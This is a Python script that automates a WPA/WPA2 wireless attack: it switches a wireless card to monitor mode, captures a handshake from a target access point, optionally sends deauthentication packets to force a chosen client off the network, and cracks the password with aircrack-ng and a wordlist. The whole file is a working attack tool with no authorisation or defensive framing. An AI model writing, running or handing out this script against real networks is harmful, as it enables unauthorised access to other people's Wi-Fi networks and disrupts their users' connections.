# WPA/WPA2 Dictionary Attack Automation Script
# This script automates the process of capturing a WPA/WPA2 handshake and
# performing a dictionary attack to crack the network password.


import subprocess
import os
import time
import threading

def setup_monitor_mode(interface):
    print(f"[+] Setting up monitor mode for {interface}...")
    subprocess.run(["sudo", "ifconfig", interface, "down"])
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"])
    subprocess.run(["sudo", "ifconfig", interface, "up"])
    print("[+] Monitor mode enabled.")

def capture_handshake(interface, bssid, channel, stop_event):
    print("[+] Starting packet capture. Waiting for WPA handshake...")
    filename = "wpa_handshake_capture"
    command = [
        "sudo", "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", filename,
        interface
    ]
    
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    while not stop_event.is_set():
        # A more robust solution would parse the output in real-time.
        # For simplicity here, we'll check for the file and let the user manually stop.
        # In a real script, you'd read proc.stdout line by line for "WPA handshake".
        if os.path.exists(f"{filename}-01.cap"):
             # A simple check; real implementation needs to confirm handshake in the file.
             print(f"[*] Capture file created. Check airodump-ng window for handshake.", end='\r')
        time.sleep(2)
    
    proc.terminate()
    print("\n[+] Packet capture stopped.")
    return f"{filename}-01.cap"

def deauth_client(interface, bssid, client_mac):
    print(f"[+] Sending deauthentication packets to {client_mac}...")
    command = [
        "sudo", "aireplay-ng",
        "--deauth", "10",
        "-a", bssid,
        "-c", client_mac,
        interface
    ]
    subprocess.run(command)

def crack_password(cap_file, wordlist):
    print(f"[+] Starting dictionary attack on {cap_file} with wordlist {wordlist}...")
    command = [
        "aircrack-ng",
        cap_file,
        "-w", wordlist
    ]
    subprocess.run(command)

if __name__ == "__main__":
    interface = input("Enter wireless interface name: ")
    bssid = input("Enter target BSSID: ")
    channel = int(input("Enter target channel: "))
    
    setup_monitor_mode(interface)

    stop_event = threading.Event()
    capture_thread = threading.Thread(target=capture_handshake, args=(interface, bssid, channel, stop_event))
    capture_thread.start()

    time.sleep(5) # Give airodump some time to start up

    if input("Do you want to run a deauthentication attack to speed up capture? (y/n): ").lower() == 'y':
        client_mac = input("Enter client MAC to deauthenticate: ")
        deauth_client(interface, bssid, client_mac)

    input("[*] Press Enter here once you see 'WPA handshake' in the airodump-ng window to stop capture and start cracking...")
    stop_event.set()
    capture_thread.join()
    
    cap_file_path = "wpa_handshake_capture-01.cap"
    if os.path.exists(cap_file_path):
        wordlist_path = input("Enter path to your wordlist file: ")
        if os.path.exists(wordlist_path):
            crack_password(cap_file_path, wordlist_path)
        else:
            print("[-] Wordlist file not found.")
    else:
        print("[-] Capture file not created. Handshake may not have been captured.")